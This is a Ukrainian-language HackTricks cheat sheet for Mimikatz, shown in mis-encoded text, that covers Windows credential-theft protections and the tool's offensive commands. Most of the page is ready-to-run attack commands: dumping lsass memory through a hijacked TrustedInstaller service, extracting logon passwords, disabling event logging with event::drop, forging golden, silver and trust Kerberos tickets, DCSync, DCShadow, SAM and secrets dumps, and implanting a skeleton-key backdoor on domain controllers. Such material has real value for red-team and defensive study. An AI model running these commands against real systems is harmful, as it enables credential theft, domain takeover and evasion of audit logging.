# Mimikatz

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* –ü—Ä–∞—Ü—é—î—Ç–µ –≤ **–∫—ñ–±–µ—Ä–±–µ–∑–ø–µ—Ü—ñ–≤—ñ–π –∫–æ–º–ø–∞–Ω—ñ—ó**? –•–æ—á–µ—Ç–µ, —â–æ–± –≤–∞—à–∞ **–∫–æ–º–ø–∞–Ω—ñ—è —Ä–µ–∫–ª–∞–º—É–≤–∞–ª–∞—Å—è –Ω–∞ HackTricks**? –∞–±–æ —Ö–æ—á–µ—Ç–µ –º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ **–æ—Å—Ç–∞–Ω–Ω—å–æ—ó –≤–µ—Ä—Å—ñ—ó PEASS –∞–±–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**? –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** [**üí¨**](https://emojipedia.org/speech-balloon/) [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –º–Ω–æ—é –Ω–∞ **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—é hacktricks**](https://github.com/carlospolop/hacktricks) **—Ç–∞** [**—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—é hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**–¶—è —Å—Ç–æ—Ä—ñ–Ω–∫–∞ –±–∞–∑—É—î—Ç—å—Å—è –Ω–∞ –æ–¥–Ω—ñ–π –∑ [adsecurity.org](https://adsecurity.org/?page\_id=1821)**. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –æ—Ä–∏–≥—ñ–Ω–∞–ª –¥–ª—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó!

## LM —Ç–∞ —á—ñ—Ç–∫–∏–π —Ç–µ–∫—Å—Ç —É –ø–∞–º'—è—Ç—ñ

–ü–æ—á–∏–Ω–∞—é—á–∏ –∑ Windows 8.1 —Ç–∞ Windows Server 2012 R2, –±—É–ª–∏ –≤–ø—Ä–æ–≤–∞–¥–∂–µ–Ω—ñ –∑–Ω–∞—á–Ω—ñ –∑–∞—Ö–æ–¥–∏ –¥–ª—è –∑–∞—Ö–∏—Å—Ç—É –≤—ñ–¥ –∫—Ä–∞–¥—ñ–∂–∫–∏ –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö:

- **–•–µ—à—ñ LM —Ç–∞ –ø–∞—Ä–æ–ª—ñ —É —á—ñ—Ç–∫–æ–º—É —Ç–µ–∫—Å—Ç—ñ** –±—ñ–ª—å—à–µ –Ω–µ –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è –≤ –ø–∞–º'—è—Ç—ñ –¥–ª—è –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –±–µ–∑–ø–µ–∫–∏. –ö–æ–Ω–∫—Ä–µ—Ç–Ω–∞ –Ω–∞—Å—Ç—Ä–æ–π–∫–∞ —Ä–µ—î—Å—Ç—Ä—É, _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_, –ø–æ–≤–∏–Ω–Ω–∞ –±—É—Ç–∏ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∞ –∑—ñ –∑–Ω–∞—á–µ–Ω–Ω—è–º DWORD `0`, —â–æ–± –≤–∏–º–∫–Ω—É—Ç–∏ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é Digest, –∑–∞–±–µ–∑–ø–µ—á—É—é—á–∏, —â–æ "—á—ñ—Ç–∫—ñ" –ø–∞—Ä–æ–ª—ñ –Ω–µ –∫–µ—à—É—é—Ç—å—Å—è –≤ LSASS.

- –í–≤–µ–¥–µ–Ω–æ **LSA Protection**, —â–æ–± –∑–∞—Ö–∏—Å—Ç–∏—Ç–∏ –ø—Ä–æ—Ü–µ—Å Local Security Authority (LSA) –≤—ñ–¥ –Ω–µ—Å–∞–Ω–∫—Ü—ñ–æ–Ω–æ–≤–∞–Ω–æ–≥–æ —á–∏—Ç–∞–Ω–Ω—è –ø–∞–º'—è—Ç—ñ —Ç–∞ –≤–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—è –∫–æ–¥—É. –¶–µ –¥–æ—Å—è–≥–∞—î—Ç—å—Å—è —à–ª—è—Ö–æ–º –ø–æ–∑–Ω–∞—á–µ–Ω–Ω—è LSASS —è–∫ –∑–∞—Ö–∏—â–µ–Ω–∏–π –ø—Ä–æ—Ü–µ—Å. –ê–∫—Ç–∏–≤–∞—Ü—ñ—è –∑–∞—Ö–∏—Å—Ç—É LSA –≤–∫–ª—é—á–∞—î:
1. –ó–º—ñ–Ω—É —Ä–µ—î—Å—Ç—Ä—É –∑–∞ –∞–¥—Ä–µ—Å–æ—é _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ —à–ª—è—Ö–æ–º –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è `RunAsPPL` –Ω–∞ `dword:00000001`.
2. –í–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—è –æ–±'—î–∫—Ç–∞ –ø–æ–ª—ñ—Ç–∏–∫–∏ –≥—Ä—É–ø–∏ (GPO), —è–∫–∏–π –∑–∞–±–µ–∑–ø–µ—á—É—î —Ü—é –∑–º—ñ–Ω—É —Ä–µ—î—Å—Ç—Ä—É –Ω–∞ –∫–µ—Ä–æ–≤–∞–Ω–∏—Ö –ø—Ä–∏—Å—Ç—Ä–æ—è—Ö.

–ù–µ–∑–≤–∞–∂–∞—é—á–∏ –Ω–∞ —Ü—ñ –∑–∞—Ö–æ–¥–∏ –∑–∞—Ö–∏—Å—Ç—É, —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏, —Ç–∞–∫—ñ —è–∫ Mimikatz, –º–æ–∂—É—Ç—å –æ–±—ñ–π—Ç–∏ –∑–∞—Ö–∏—Å—Ç LSA –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏—Ö –¥—Ä–∞–π–≤–µ—Ä—ñ–≤, —Ö–æ—á–∞ —Ç–∞–∫—ñ –¥—ñ—ó –π–º–æ–≤—ñ—Ä–Ω–æ –±—É–¥—É—Ç—å –∑–∞—Ñ—ñ–∫—Å–æ–≤–∞–Ω—ñ –≤ –∂—É—Ä–Ω–∞–ª–∞—Ö –ø–æ–¥—ñ–π.

### –ü—Ä–æ—Ç–∏–¥—ñ—è –≤–∏–ª—É—á–µ–Ω–Ω—é –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ SeDebugPrivilege

–ó–∞–∑–≤–∏—á–∞–π –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∏ –º–∞—é—Ç—å –ø—Ä–∏–≤—ñ–ª–µ—ó SeDebugPrivilege, —â–æ –¥–æ–∑–≤–æ–ª—è—î —ó–º –Ω–∞–ª–∞–≥–æ–¥–∂—É–≤–∞—Ç–∏ –ø—Ä–æ–≥—Ä–∞–º–∏. –¶—ñ –ø—Ä–∏–≤—ñ–ª–µ—ó –º–æ–∂—É—Ç—å –±—É—Ç–∏ –æ–±–º–µ–∂–µ–Ω—ñ, —â–æ–± –∑–∞–ø–æ–±—ñ–≥—Ç–∏ –Ω–µ—Å–∞–Ω–∫—Ü—ñ–æ–Ω–æ–≤–∞–Ω–∏–º –≤–∏—Ç–æ–∫–∞–º –ø–∞–º'—è—Ç—ñ, –∑–∞–≥–∞–ª—å–Ω—ñ–π —Ç–µ—Ö–Ω—ñ—Ü—ñ, —è–∫—É –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∏ –¥–ª—è –≤–∏–ª—É—á–µ–Ω–Ω—è –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö –∑ –ø–∞–º'—è—Ç—ñ. –û–¥–Ω–∞–∫ –Ω–∞–≤—ñ—Ç—å –ø—Ä–∏ –≤–∏–ª—É—á–µ–Ω–Ω—ñ —Ü–∏—Ö –ø—Ä–∏–≤—ñ–ª–µ—ó–≤, –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –≤—Å–µ —â–µ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–ª—É—á–µ–Ω—ñ –æ–±–ª—ñ–∫–æ–≤–∏–º –∑–∞–ø–∏—Å–æ–º TrustedInstaller –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è —Å–ø–µ—Ü—ñ–∞–ª—ñ–∑–æ–≤–∞–Ω–æ—ó –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó —Å–ª—É–∂–±–∏:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
–¶–µ –¥–æ–∑–≤–æ–ª—è—î –≤–∏–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –ø–∞–º'—è—Ç—å `lsass.exe` –≤ —Ñ–∞–π–ª, —è–∫–∏–π –ø–æ—Ç—ñ–º –º–æ–∂–Ω–∞ –ø—Ä–æ–∞–Ω–∞–ª—ñ–∑—É–≤–∞—Ç–∏ –Ω–∞ —ñ–Ω—à—ñ–π —Å–∏—Å—Ç–µ–º—ñ –¥–ª—è –≤–∏–¥–æ–±—É—Ç—Ç—è –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## –û–ø—Ü—ñ—ó Mimikatz

–ü—ñ–¥—Ä–æ–±–∫–∞ –∂—É—Ä–Ω–∞–ª—É –ø–æ–¥—ñ–π –≤ Mimikatz –≤–∫–ª—é—á–∞—î –¥–≤—ñ –æ—Å–Ω–æ–≤–Ω—ñ –¥—ñ—ó: –æ—á–∏—â–µ–Ω–Ω—è –∂—É—Ä–Ω–∞–ª—ñ–≤ –ø–æ–¥—ñ–π —Ç–∞ –ø–∞—Ç—á—ñ–Ω–≥ —Å–ª—É–∂–±–∏ –ü–æ–¥—ñ–π –¥–ª—è –∑–∞–ø–æ–±—ñ–≥–∞–Ω–Ω—è —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó –Ω–æ–≤–∏—Ö –ø–æ–¥—ñ–π. –ù–∏–∂—á–µ –Ω–∞–≤–µ–¥–µ–Ω—ñ –∫–æ–º–∞–Ω–¥–∏ –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —Ü–∏—Ö –¥—ñ–π:

#### –û—á–∏—â–µ–Ω–Ω—è –∂—É—Ä–Ω–∞–ª—ñ–≤ –ø–æ–¥—ñ–π

- **–ö–æ–º–∞–Ω–¥–∞**: –¶—è –¥—ñ—è —Å–ø—Ä—è–º–æ–≤–∞–Ω–∞ –Ω–∞ –≤–∏–¥–∞–ª–µ–Ω–Ω—è –∂—É—Ä–Ω–∞–ª—ñ–≤ –ø–æ–¥—ñ–π, —É—Å–∫–ª–∞–¥–Ω—é—é—á–∏ –≤—ñ–¥—Å—Ç–µ–∂–µ–Ω–Ω—è –∑–ª–æ–≤–º–∏—Å–Ω–∏—Ö –¥—ñ–π.
- Mimikatz –Ω–µ –Ω–∞–¥–∞—î –ø—Ä—è–º–æ—ó –∫–æ–º–∞–Ω–¥–∏ —É —Å–≤–æ—ó–π —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ñ–π –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—ó –¥–ª—è –æ—á–∏—â–µ–Ω–Ω—è –∂—É—Ä–Ω–∞–ª—ñ–≤ –ø–æ–¥—ñ–π –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ —á–µ—Ä–µ–∑ –∫–æ–º–∞–Ω–¥–Ω–∏–π —Ä—è–¥–æ–∫. –û–¥–Ω–∞–∫ –º–∞–Ω—ñ–ø—É–ª—é–≤–∞–Ω–Ω—è –∂—É—Ä–Ω–∞–ª–∞–º–∏ –ø–æ–¥—ñ–π –∑–∞–∑–≤–∏—á–∞–π –≤–∫–ª—é—á–∞—î –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Å–∏—Å—Ç–µ–º–Ω–∏—Ö —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ñ–≤ –∞–±–æ —Å—Ü–µ–Ω–∞—Ä—ñ—ó–≤ –ø–æ–∑–∞ –º–µ–∂–∞–º–∏ Mimikatz –¥–ª—è –æ—á–∏—â–µ–Ω–Ω—è –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏—Ö –∂—É—Ä–Ω–∞–ª—ñ–≤ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é PowerShell –∞–±–æ Windows Event Viewer).

#### –ï–∫—Å–ø–µ—Ä–∏–º–µ–Ω—Ç–∞–ª—å–Ω–∞ —Ñ—É–Ω–∫—Ü—ñ—è: –ü–∞—Ç—á–∏–Ω–≥ —Å–ª—É–∂–±–∏ –ü–æ–¥—ñ–π

- **–ö–æ–º–∞–Ω–¥–∞**: `event::drop`
- –¶—è –µ–∫—Å–ø–µ—Ä–∏–º–µ–Ω—Ç–∞–ª—å–Ω–∞ –∫–æ–º–∞–Ω–¥–∞ –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∞ –¥–ª—è –∑–º—ñ–Ω–∏ –ø–æ–≤–µ–¥—ñ–Ω–∫–∏ —Å–ª—É–∂–±–∏ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó –ø–æ–¥—ñ–π, –µ—Ñ–µ–∫—Ç–∏–≤–Ω–æ –∑–∞–ø–æ–±—ñ–≥–∞—é—á–∏ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó –Ω–æ–≤–∏—Ö –ø–æ–¥—ñ–π.
- –ü—Ä–∏–∫–ª–∞–¥: `mimikatz "privilege::debug" "event::drop" exit`

- –ö–æ–º–∞–Ω–¥–∞ `privilege::debug` –∑–∞–±–µ–∑–ø–µ—á—É—î, —â–æ Mimikatz –ø—Ä–∞—Ü—é—î –∑ –Ω–µ–æ–±—Ö—ñ–¥–Ω–∏–º–∏ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏ –¥–ª—è –º–æ–¥–∏—Ñ—ñ–∫–∞—Ü—ñ—ó —Å–∏—Å—Ç–µ–º–Ω–∏—Ö —Å–ª—É–∂–±.
- –ö–æ–º–∞–Ω–¥–∞ `event::drop` –ø–∞—Ç—á–∏—Ç—å —Å–ª—É–∂–±—É —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó –ø–æ–¥—ñ–π.


### –ê—Ç–∞–∫–∏ –Ω–∞ –∫–≤–∏—Ç–∫–∏ Kerberos

### –°—Ç–≤–æ—Ä–µ–Ω–Ω—è –ó–æ–ª–æ—Ç–æ–≥–æ –ö–≤–∏—Ç–∫–∞

–ó–æ–ª–æ—Ç–∏–π –ö–≤–∏—Ç–æ–∫ –¥–æ–∑–≤–æ–ª—è—î —ñ–º—ñ—Ç—É–≤–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –Ω–∞ —Ä—ñ–≤–Ω—ñ –¥–æ–º–µ–Ω—É. –û—Å–Ω–æ–≤–Ω–∞ –∫–æ–º–∞–Ω–¥–∞ —Ç–∞ –ø–∞—Ä–∞–º–µ—Ç—Ä–∏:

- –ö–æ–º–∞–Ω–¥–∞: `kerberos::golden`
- –ü–∞—Ä–∞–º–µ—Ç—Ä–∏:
- `/domain`: –ù–∞–∑–≤–∞ –¥–æ–º–µ–Ω—É.
- `/sid`: –Ü–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä –±–µ–∑–ø–µ–∫–∏ (SID) –¥–æ–º–µ–Ω—É.
- `/user`: –Ü–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –¥–ª—è —ñ–º—ñ—Ç–∞—Ü—ñ—ó.
- `/krbtgt`: –•–µ—à NTLM –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É —Å–ª—É–∂–±–∏ KDC –¥–æ–º–µ–Ω—É.
- `/ptt`: –ü—Ä—è–º–µ –≤–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—è –∫–≤–∏—Ç–∫–∞ –≤ –ø–∞–º'—è—Ç—å.
- `/ticket`: –ó–±–µ—Ä—ñ–≥–∞—î –∫–≤–∏—Ç–æ–∫ –¥–ª—è –ø–æ–¥–∞–ª—å—à–æ–≥–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è.

–ü—Ä–∏–∫–ª–∞–¥:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### –°—Ç–≤–æ—Ä–µ–Ω–Ω—è –°—Ä—ñ–±–Ω–æ–≥–æ –ö–≤–∏—Ç–∫–∞

–°—Ä—ñ–±–Ω—ñ –∫–≤–∏—Ç–∫–∏ –Ω–∞–¥–∞—é—Ç—å –¥–æ—Å—Ç—É–ø –¥–æ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏—Ö —Å–ª—É–∂–±. –û—Å–Ω–æ–≤–Ω–∞ –∫–æ–º–∞–Ω–¥–∞ —Ç–∞ –ø–∞—Ä–∞–º–µ—Ç—Ä–∏:

- –ö–æ–º–∞–Ω–¥–∞: –°—Ö–æ–∂–∞ –Ω–∞ –ó–æ–ª–æ—Ç–∏–π –ö–≤–∏—Ç–æ–∫, –∞–ª–µ —Å–ø—Ä—è–º–æ–≤–∞–Ω–∞ –Ω–∞ –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ñ —Å–ª—É–∂–±–∏.
- –ü–∞—Ä–∞–º–µ—Ç—Ä–∏:
- `/service`: –°–ª—É–∂–±–∞, –Ω–∞ —è–∫—É —Å–ø—Ä—è–º–æ–≤–∞–Ω–æ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, cifs, http).
- –Ü–Ω—à—ñ –ø–∞—Ä–∞–º–µ—Ç—Ä–∏ —Å—Ö–æ–∂—ñ –Ω–∞ –ó–æ–ª–æ—Ç–∏–π –ö–≤–∏—Ç–æ–∫.

–ü—Ä–∏–∫–ª–∞–¥:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### –°—Ç–≤–æ—Ä–µ–Ω–Ω—è –¥–æ–≤—ñ—Ä—á–æ–≥–æ –∫–≤–∏—Ç–∫–∞

–î–æ–≤—ñ—Ä—á—ñ –∫–≤–∏—Ç–∫–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –¥–ª—è –¥–æ—Å—Ç—É–ø—É –¥–æ —Ä–µ—Å—É—Ä—Å—ñ–≤ –º—ñ–∂ –¥–æ–º–µ–Ω–∞–º–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –¥–æ–≤—ñ—Ä—á–∏—Ö –≤—ñ–¥–Ω–æ—Å–∏–Ω. –û—Å–Ω–æ–≤–Ω–∞ –∫–æ–º–∞–Ω–¥–∞ —Ç–∞ –ø–∞—Ä–∞–º–µ—Ç—Ä–∏:

- –ö–æ–º–∞–Ω–¥–∞: –°—Ö–æ–∂–∞ –Ω–∞ –ó–æ–ª–æ—Ç–∏–π –ö–≤–∏—Ç–æ–∫, –∞–ª–µ –¥–ª—è –¥–æ–≤—ñ—Ä—á–∏—Ö –≤—ñ–¥–Ω–æ—Å–∏–Ω.
- –ü–∞—Ä–∞–º–µ—Ç—Ä–∏:
- `/target`: –ü–æ–≤–Ω–µ –¥–æ–º–µ–Ω–Ω–µ —ñ–º'—è —Ü—ñ–ª—å–æ–≤–æ–≥–æ –¥–æ–º–µ–Ω—É.
- `/rc4`: –•–µ—à NTLM –¥–ª—è –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É –¥–æ–≤—ñ—Ä–∏.

–ü—Ä–∏–∫–ª–∞–¥:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### –î–æ–¥–∞—Ç–∫–æ–≤—ñ –∫–æ–º–∞–Ω–¥–∏ Kerberos

- **–í–∏–≤–µ–¥–µ–Ω–Ω—è –∫–≤–∏—Ç–∫—ñ–≤**:
- –ö–æ–º–∞–Ω–¥–∞: `kerberos::list`
- –ü–æ–∫–∞–∑—É—î –≤—Å—ñ Kerberos-–∫–≤–∏—Ç–∫–∏ –¥–ª—è –ø–æ—Ç–æ—á–Ω–æ—ó —Å–µ—Å—ñ—ó –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞.

- **–ü–µ—Ä–µ–¥–∞—á–∞ –∫–µ—à—É**:
- –ö–æ–º–∞–Ω–¥–∞: `kerberos::ptc`
- –í–ø—Ä–æ–≤–∞–¥–∂—É—î Kerberos-–∫–≤–∏—Ç–∫–∏ –∑ —Ñ–∞–π–ª—ñ–≤ –∫–µ—à—É.
- –ü—Ä–∏–∫–ª–∞–¥: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **–ü–µ—Ä–µ–¥–∞—á–∞ –∫–≤–∏—Ç–∫–∞**:
- –ö–æ–º–∞–Ω–¥–∞: `kerberos::ptt`
- –î–æ–∑–≤–æ–ª—è—î –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ Kerberos-–∫–≤–∏—Ç–æ–∫ –≤ —ñ–Ω—à—ñ–π —Å–µ—Å—ñ—ó.
- –ü—Ä–∏–∫–ª–∞–¥: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **–û—á–∏—â–µ–Ω–Ω—è –∫–≤–∏—Ç–∫—ñ–≤**:
- –ö–æ–º–∞–Ω–¥–∞: `kerberos::purge`
- –û—á–∏—â–∞—î –≤—Å—ñ Kerberos-–∫–≤–∏—Ç–∫–∏ –∑ —Å–µ—Å—ñ—ó.
- –ö–æ—Ä–∏—Å–Ω–æ –ø–µ—Ä–µ–¥ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è–º –∫–æ–º–∞–Ω–¥ –º–∞–Ω—ñ–ø—É–ª—é–≤–∞–Ω–Ω—è –∫–≤–∏—Ç–∫–∞–º–∏ –¥–ª—è —É–Ω–∏–∫–Ω–µ–Ω–Ω—è –∫–æ–Ω—Ñ–ª—ñ–∫—Ç—ñ–≤.


### –í—Ç—Ä—É—á–∞–Ω–Ω—è –≤ –¥—ñ—è–ª—å–Ω—ñ—Å—Ç—å Active Directory

- **DCShadow**: –¢–∏–º—á–∞—Å–æ–≤–æ –∑–º—É—à—É—î –º–∞—à–∏–Ω—É –¥—ñ—è—Ç–∏ —è–∫ DC –¥–ª—è –º–∞–Ω—ñ–ø—É–ª—é–≤–∞–Ω–Ω—è –æ–±'—î–∫—Ç–∞–º–∏ AD.
- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: –Ü–º—ñ—Ç—É—î DC –¥–ª—è –∑–∞–ø–∏—Ç—É –¥–∞–Ω–∏—Ö –ø–∞—Ä–æ–ª—è.
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### –û—Ç—Ä–∏–º–∞–Ω–Ω—è –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö

- **LSADUMP::LSA**: –í–∏—Ç—è–≥—É—î –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –∑ LSA.
- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: –Ü–º—ñ—Ç—É—î DC, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –¥–∞–Ω—ñ –ø–∞—Ä–æ–ª—è –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É –∫–æ–º–ø'—é—Ç–µ—Ä–∞.
- *–í –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–æ–º—É –∫–æ–Ω—Ç–µ–∫—Å—Ç—ñ –Ω–µ –Ω–∞–¥–∞–Ω–æ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ—ó –∫–æ–º–∞–Ω–¥–∏ –¥–ª—è NetSync.*

- **LSADUMP::SAM**: –î–æ—Å—Ç—É–ø –¥–æ –ª–æ–∫–∞–ª—å–Ω–æ—ó –±–∞–∑–∏ –¥–∞–Ω–∏—Ö SAM.
- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: –†–æ–∑—à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è —Å–µ–∫—Ä–µ—Ç—ñ–≤, –∑–±–µ—Ä–µ–∂–µ–Ω–∏—Ö —É —Ä–µ—î—Å—Ç—Ä—ñ.
- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: –í—Å—Ç–∞–Ω–æ–≤–ª—é—î –Ω–æ–≤–∏–π —Ö–µ—à NTLM –¥–ª—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞.
- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: –û—Ç—Ä–∏–º–∞–Ω–Ω—è —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é –¥–æ–≤—ñ—Ä–∏.
- `mimikatz "lsadump::trust" exit`

### –†—ñ–∑–Ω–µ

- **MISC::Skeleton**: –í–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—è –∑–∞–¥–Ω—ñ—Ö –¥–≤–µ—Ä–µ–π –≤ LSASS –Ω–∞ DC.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### –ü—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤

- **PRIVILEGE::Backup**: –û—Ç—Ä–∏–º–∞–Ω–Ω—è –ø—Ä–∞–≤ –Ω–∞ —Ä–µ–∑–µ—Ä–≤–Ω–µ –∫–æ–ø—ñ—é–≤–∞–Ω–Ω—è.
- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: –û—Ç—Ä–∏–º–∞–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –Ω–∞–ª–∞–≥–æ–¥–∂–µ–Ω–Ω—è.
- `mimikatz "privilege::debug" exit`

### –û—Ç—Ä–∏–º–∞–Ω–Ω—è –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö

- **SEKURLSA::LogonPasswords**: –ü–æ–∫–∞–∑—É—î –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –¥–ª—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, —è–∫—ñ —É–≤—ñ–π—à–ª–∏ –≤ —Å–∏—Å—Ç–µ–º—É.
- `mimikatz "sekurlsa::logonpasswords" exit`

